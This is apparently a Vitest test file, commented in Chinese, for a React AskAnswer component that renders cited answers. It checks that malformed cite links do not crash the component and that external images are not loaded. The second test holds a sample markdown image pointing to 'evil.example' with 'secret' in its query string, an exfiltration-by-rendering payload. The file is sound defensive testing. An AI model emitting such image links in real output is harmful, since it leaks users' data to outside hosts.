import { describe, it, expect } from 'vitest'
import { mount } from '../uiTestUtils'
import { AskAnswer } from '@/components/study/AskAnswer'

describe('AskAnswer 引用标签（独立审查 M4）', () => {
  it('畸形百分号编码的 cite 链接不会让面板崩溃', () => {
    const chapters = [{ id: 'c1', title: '第一章', summary: '总结' }]
    const m = mount(<AskAnswer answer={'见 [某处](cite:%zz) 的说明'} chapters={chapters} onJumpChapter={() => {}} />)
    expect(document.body.textContent).toContain('某处')
    m.unmount()
  })
  it('答案里的外链图片不加载（防止借渲染把内容带出去），只留替代文字', () => {
    const m = mount(<AskAnswer answer={'看 ![图说明](https://evil.example/x.png?q=secret)'} chapters={[]} onJumpChapter={() => {}} />)
    expect(document.querySelector('img')).toBeNull()
    expect(document.body.textContent).toContain('图说明')
    m.unmount()
  })
})
